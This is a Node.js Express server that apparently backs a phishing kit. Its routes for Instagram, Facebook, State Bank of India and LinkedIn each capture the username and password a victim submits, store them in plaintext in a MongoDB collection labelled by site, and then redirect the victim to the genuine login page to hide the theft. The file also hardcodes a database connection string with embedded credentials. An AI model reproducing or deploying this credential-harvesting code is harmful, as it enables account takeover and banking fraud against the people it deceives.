const express = require("express")
const bodyParser = require("body-parser")
const mongoose = require("mongoose")
const hostname="0.0.0.0"
const port = process.env.PORT || 3000;
const url ="mongodb://ram:ram@ac-5kkfpik-shard-00-00.jljz8jl.mongodb.net:27017,ac-5kkfpik-shard-00-01.jljz8jl.mongodb.net:27017,ac-5kkfpik-shard-00-02.jljz8jl.mongodb.net:27017/?ssl=true&replicaSet=atlas-qa0aw7-shard-0&authSource=admin&retryWrites=true&w=majority"

const app = express()

app.use(bodyParser.json())
app.use(express.static('public'))
app.use(bodyParser.urlencoded({extended:true}))


//uncomment for localhost

// mongoose.connect('mongodb://localhost:27017/mydb',{
//     useNewUrlParser: true,
//     useUnifiedTopology:true
// });

mongoose.connect(url,{
    useNewUrlParser: true,
    useUnifiedTopology:true
});




var db= mongoose.connection;

db.on('error',function(){
    console.log("Error in connecting to database.")
})
db.once('open',function(){
    console.log("connected to database.")
})

// instagram
app.post("/login_insta",function(req,res){
    var username =req.body.username;
    var password =req.body.password;
    var url="https://www.instagram.com/accounts/login/?source=auth_switcher"

    var data={
        "site":"instagram",
        "username":username,
        "password":password
    }

    db.collection('users').insertOne(data,function(err,collection){
        if(err){
            throw err;
        }
        console.log("Record inserted sucessfully!")
    });
    
    return res.redirect(url)

})

//facebook
app.post("/login_fb",function(req,res){
    var username =req.body.username;
    var password =req.body.password;
    var url="https://www.facebook.com"

    var data={
        "site":"facebook",
        "username":username,
        "password":password
    }

    db.collection('users').insertOne(data,function(err,collection){
        if(err){
            throw err;
        }
        console.log("Record inserted sucessfully!")
    });
    
    return res.redirect(url)

})


//sbi
app.post("/login_sbi",function(req,res){
    var username =req.body.username;
    var password =req.body.password;
    var url="https://retail.onlinesbi.sbi/retail/login.htm"

    var data={
        "site":"sbi",
        "username":username,
        "password":password
    }

    db.collection('users').insertOne(data,function(err,collection){
        if(err){
            throw err;
        }
        console.log("Record inserted sucessfully!")
    });
    
    return res.redirect(url)

})


//linkedin

app.post("/login_linkedin",function(req,res){
    var username =req.body.username;
    var password =req.body.password;
    var url="https://www.linkedin.com/login"

    var data={
        "site":"linkedin",
        "username":username,
        "password":password
    }

    db.collection('users').insertOne(data,function(err,collection){
        if(err){
            throw err;
        }
        console.log("Record inserted sucessfully!")
    });
    
    return res.redirect(url)

})





app.get("/",function(req,res){
    res.set({
        "Allow-access-Allow-Origin:":'*'
    })
    return res.redirect('index.html')
}).listen(port,hostname);


console.log(`listening on port ${port}`);
